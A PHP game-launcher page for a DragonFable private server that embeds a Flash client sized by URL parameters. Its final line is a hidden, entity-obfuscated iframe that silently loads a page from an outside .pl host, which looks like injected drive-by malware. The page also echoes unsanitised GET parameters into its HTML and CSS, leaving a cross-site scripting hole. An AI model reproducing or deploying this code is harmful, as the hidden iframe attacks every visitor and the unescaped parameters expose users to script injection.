<?php
include ("../includes/config.php");
$width = $_GET["w"];
$height = $_GET["h"];
$fontsize = $_GET["f"];
if ($width == "") { $width = "750"; } 
if ($height == "") { $height = "550"; } 
if ($fontsize == "") { $fontsize = "10"; }
$query = mysql_query("SELECT * FROM df_settings LIMIT 1");
$fetch = mysql_fetch_assoc($query);
$loaderSWF = $fetch['loaderSWF'];
$gameSWF = $fetch['gameSWF'];
$sitename = $fetch['DFSitename'];
?>
</html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title><?php echo $sitename; ?> - DragonFable Private Server</title>
<link href="http://dragonfable.battleon.com/includes/dragonfable.css" rel="stylesheet" type="text/css" />
<script src="../includes/AC_RunActiveContent.js" type="text/javascript"></script>
<script src="http://dragonfable.battleon.com/game/gamefiles/ballyhoo/ballyhoo.js?ver=2" type="text/javascript"></script>
<style type="text/css">
<!--
body   {background: #530000;}
.floater { visibility:hidden; width:100%; height:100%; position:absolute; z-index:2; float:none; top:0px; left:0px; font-size:<?php echo $fontsize; ?>px;}
.main { visibility:visible; }
-->
</style>
</head>
<body>
<div id="main" align="center" class="main">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td align="center" valign="middle">
      <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" id="FFable" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="<?php echo $width ?>" height="<?php echo $height ?>" align="middle">
        <param name="allowScriptAccess" value="sameDomain" />
        <param name="movie" value="gamefiles/<?php echo $loaderSWF; ?>" />
        <param name="menu" value="false" />
        <param name="allowFullScreen" value="true" />
        <param name="flashvars" value="strFileName=<?php echo $gameSWF; ?>" />
        <param name="bgcolor" value="#530000" />
        <embed src="gamefiles/<?php echo $loaderSWF; ?>" FLASHVARS="strFileName=<?php echo $gameSWF; ?>" name="FFable" bgcolor="#530000" menu="false"  allowFullScreen="true" width="<?php echo $width ?>" height="<?php echo $height ?>" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" swLiveConnect="true" />
      </object>
      <table width="<?php echo $width; ?>" border="0" cellpadding="0" cellspacing="0" bgcolor="#360000">
<tr bgcolor="#360000">
    <td style="color: #FFFFFF; font-family: Verdana; font-size: <?php echo $fontsize ?>px; text-align: center;">Credits to: MentalBlank, HellFireAE and the DFPS Team<br />
    <a href="index.php?w=475&h=350&f=8">Tiny</a> | <a href="index.php?w=750&h=550&f=10">Normal</a> | <a href="index.php?w=1150&h=840&f=14">Large</a> | <a href="index.php?w=1750&h=1280&f=19">Huge</a></td>
</tr>
</table>
  </tr>
</table>
</div>
<div id="showcase" class="floater">
<center>
<br/><br/><span class="server">You are viewing a sponsor advertisement.  Clicking the ad will open a new browser window.<br/>In a few seconds, a button will appear to send you back to <?php echo $sitename; ?>.<br/></span>
<div id="closer" style="visibility:hidden">
    <input style="height:32px" type="button" onclick="javascript:showIt('hide');" value="Click here to return to <?php echo $sitename; ?>" />
</div>
<br/><br/>
<iframe id="ff" width="100%" height="10px" frameborder="0" src="http://dragonfable.battleon.com/game/blank.asp" scrolling="no" marginheight="0" marginwidth="0"></iframe>
</center>
</div>
<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>